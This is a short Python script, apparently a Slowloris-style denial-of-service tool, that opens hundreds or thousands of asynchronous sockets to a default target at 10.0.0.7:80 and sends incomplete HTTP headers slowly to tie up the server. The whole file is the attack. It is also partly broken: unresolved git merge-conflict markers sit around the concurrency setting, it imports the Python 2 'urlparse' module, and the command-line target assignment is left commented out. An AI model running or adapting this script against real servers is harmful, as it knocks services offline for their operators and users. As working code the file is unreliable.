#!/usr/bin/env python3

import socket
import asyncio
import random
import sys

# Delay factor, some noise is added.
DELAY = 1

# Number of concurrent requests that are happening, threads are not used.
# To get this above 1024 on linux, you have to edit /etc/security/limits.conf
# and add a line like vita soft nofile 2000
# and vita hard nofile 40000
# You can check the status of these limits with ulimit -Hn and ulimit -Sn
<<<<<<< HEAD
CONCURRENT_REQUESTS = 1000
=======
CONCURRENT_REQUESTS = 8000 
>>>>>>> 0f992af6e10a782b7cd70bbc382c45b179c47c0e

def fl():
    sys.stdout.flush()

async def hit_server(target):
    await asyncio.gather(
        *[asyncio.create_task(papercut(target, i)) for i in range(CONCURRENT_REQUESTS)]
        )

# Single thread that will keep attempting to 
# send requests to the server that _will_ time out.
async def papercut(target, i):
    while True:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        await asyncio.sleep(random.random()*DELAY)
        soc.connect(target)
        print('N', end='')
        fl()
        soc.send(
                ('GET / HTTP/1.1\r\n' + 
                'Connection: keep-alive\r\n' + 
                'Content-Length: 10000\r\n').encode())
        try:
            for v in range(20):
                await asyncio.sleep(random.random()*DELAY)
                print('C', end='')
                fl()
                soc.send(('adsf' + str(v) + ": 5\r\n").encode())
        except BrokenPipeError:
            print('B', end='')
            fl()
            soc.close()
if __name__ == '__main__':
    import sys
    target = None
    if len(sys.argv) == 1:
        target = ('10.0.0.7', 80)
    elif len(sys.argv) == 3:
        import urlparse
#        target = 
    asyncio.run(hit_server(target))
